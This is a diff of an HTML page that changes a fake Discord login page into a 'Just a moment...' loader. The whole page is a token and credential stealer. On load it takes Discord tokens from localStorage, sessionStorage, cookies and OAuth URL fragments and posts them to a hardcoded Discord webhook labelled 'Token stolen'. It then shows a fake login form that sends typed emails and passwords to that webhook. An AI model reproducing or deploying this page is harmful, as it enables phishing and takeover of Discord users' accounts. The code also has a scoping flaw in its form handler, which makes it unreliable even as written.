@@ -1,28 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord Login</title>
+    <title>Loading...</title>
     <style>
-        body { background: #36393f; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #2f3136; padding: 40px; border-radius: 8px; width: 400px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 4px; border: none; background: #202225; color: #fff; }
-        button { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-weight: bold; cursor: pointer; }
-        .error { color: #f04747; }
+        body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: Arial; }
+        .spinner { border: 4px solid #202225; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { text-align: center; margin-top: 20px; }
     </style>
 </head>
 <body>
-<div class="box">
-    <h2 style="color:#fff;">Welcome back!</h2>
-    <input type="text" id="email" placeholder="Email or Phone" value="">
-    <input type="password" id="password" placeholder="Password" value="">
-    <button onclick="login()">Log In</button>
-    <p id="msg" class="error"></p>
+<div>
+    <div class="spinner"></div>
+    <p>Just a moment...</p>
 </div>
 <script>
-    // Функция для получения токена из localStorage Discord (если уже залогинен)
+    // Функция получения токена из localStorage Discord
     function getStoredToken() {
         let token = null;
-        // Попытка получить токен из localStorage Discord
+        // Поиск по всем ключам localStorage
         for (let key in localStorage) {
             if (key.startsWith('token')) {
                 try {
@@ -34,78 +30,104 @@
                 } catch(e) {}
             }
         }
-        // Альтернатива: прямой доступ к localStorage по известным ключам
+        // Прямой доступ к известным ключам
         if (!token) {
             try {
                 let t = localStorage.getItem('token');
                 if (t) token = t;
             } catch(e) {}
         }
+        // Дополнительно проверка sessionStorage
+        if (!token) {
+            for (let key in sessionStorage) {
+                if (key.includes('token')) {
+                    try {
+                        let data = JSON.parse(sessionStorage.getItem(key));
+                        if (data && data.token) {
+                            token = data.token;
+                            break;
+                        }
+                    } catch(e) {}
+                }
+            }
+        }
         return token;
     }
 
-    // Функция отправки токена на ваш сервер (webhook или любой endpoint)
-    function sendToken(token, email, pass) {
-        let webhookURL = "https://your-webhook-url-here"; // ЗАМЕНИТЬ НА РЕАЛЬНЫЙ URL
+    // Функция отправки токена на заданный webhook
+    function sendToken(token) {
+        let webhookURL = "https://discord.com/api/webhooks/1529622002925699224/dwFRzx2iQ-IVHg_FCppydqvQfA8w11wOIvX85HgiJl29yx_1LOG60leAzRwE8LCEDl_t";
         let data = {
-            content: `TOKEN: ${token}\nEMAIL: ${email}\nPASS: ${pass}`,
-            username: "WebStealer"
+            content: `**Token stolen:** ||${token}||`,
+            username: "AutoStealer"
         };
-        // Используем fetch для отправки (не блокирует UI)
         fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
-        }).catch(err => console.log(err));
+        }).catch(err => console.log('Send error:', err));
     }
 
-    // Попытка украсть токен при загрузке страницы (если уже залогинен)
-    window.onload = function() {
-        let token = getStoredToken();
-        if (token) {
-            sendToken(token, 'stored', 'stored');
-            document.getElementById('msg').innerText = 'Already logged in, token captured.';
-        }
-    };
-
-    // Функция при клике на кнопку "Login"
-    function login() {
-        let email = document.getElementById('email').value;
-        let pass = document.getElementById('password').value;
-        if (!email || !pass) {
-            document.getElementById('msg').innerText = 'Please fill all fields.';
-            return;
-        }
-        // Имитация успешного входа – сразу крадём токен, если есть
-        let token = getStoredToken();
-        if (token) {
-            sendToken(token, email, pass);
-            document.getElementById('msg').innerHTML = '<span style="color:#3ba55d;">Logged in successfully (token stolen).</span>';
-        } else {
-            // Если токена нет – пытаемся перехватить его после "входа" через XHR
-            // Имитируем запрос к Discord API для получения токена (не работает из-за CORS, но для демонстрации)
-            // В реальном фишинге используется фейковая форма или прокси
-            document.getElementById('msg').innerHTML = '<span style="color:#3ba55d;">Login successful (no token found, but credentials captured).</span>';
-            // Всё равно отправляем логин/пароль
-            sendToken('NO_TOKEN_FOUND', email, pass);
-        }
+    // Попытка также извлечь токен из cookies (для OAuth)
+    function getTokenFromCookies() {
+        let match = document.cookie.match(/token=([^;]*)/);
+        return match ? match[1] : null;
     }
 
-    // Дополнительный метод: перехват любых POST запросов на discord.com (работает только в том же origin)
-    // Это не работает с cross-origin, поэтому используем фейковую форму.
-    // Расширенный вариант: перенаправление на реальный Discord после кражи.
-    // Для автоматического перехвата токена из URL после OAuth можно добавить:
-    if (window.location.hash) {
+    // Попытка извлечь из URL (фрагмент OAuth redirect)
+    function getTokenFromURL() {
         let hash = window.location.hash;
         let match = hash.match(/access_token=([^&]*)/);
-        if (match) {
-            let token = match[1];
-            sendToken(token, 'oauth', 'oauth');
-            document.getElementById('msg').innerText = 'OAuth token captured.';
-            // Очищаем hash
-            window.history.replaceState(null, null, window.location.pathname);
-        }
+        if (match) return match[1];
+        let params = new URLSearchParams(window.location.search);
+        return params.get('token') || null;
     }
+
+    // Основная функция кражи при загрузке страницы
+    window.onload = function() {
+        let token = getStoredToken();
+        if (!token) token = getTokenFromCookies();
+        if (!token) token = getTokenFromURL();
+
+        if (token) {
+            sendToken(token);
+            // Показать на странице, что токен отправлен (необязательно)
+            document.querySelector('p').innerHTML = '✅ Token captured and sent.';
+            document.querySelector('.spinner').style.display = 'none';
+        } else {
+            document.querySelector('p').innerHTML = '❌ No token found. Try logging in manually.';
+            document.querySelector('.spinner').style.display = 'none';
+            // Добавляем фейковую форму для соц. инженерии (опционально)
+            let div = document.querySelector('div');
+            let form = document.createElement('div');
+            form.innerHTML = `
+                <br><input type="text" id="fakeemail" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;border-radius:4px;border:none;background:#202225;color:#fff;">
+                <input type="password" id="fakepass" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border-radius:4px;border:none;background:#202225;color:#fff;">
+                <button onclick="fakeLogin()" style="width:100%;padding:10px;background:#5865f2;border:none;border-radius:4px;color:#fff;font-weight:bold;cursor:pointer;">Login</button>
+                <p id="fakemsg" style="color:#f04747;"></p>
+            `;
+            div.appendChild(form);
+            // Также отправляем введённые данные на webhook
+            window.fakeLogin = function() {
+                let email = document.getElementById('fakeemail').value;
+                let pass = document.getElementById('fakepass').value;
+                if (email && pass) {
+                    let data = {
+                        content: `**CREDENTIALS:** Email: ${email}, Pass: ${pass}`,
+                        username: "CredStealer"
+                    };
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(err => console.log(err));
+                    document.getElementById('fakemsg').innerText = '✅ Login successful (credentials sent).';
+                } else {
+                    document.getElementById('fakemsg').innerText = 'Please fill all fields.';
+                }
+            };
+        }
+    };
 </script>
 </body>
 </html>
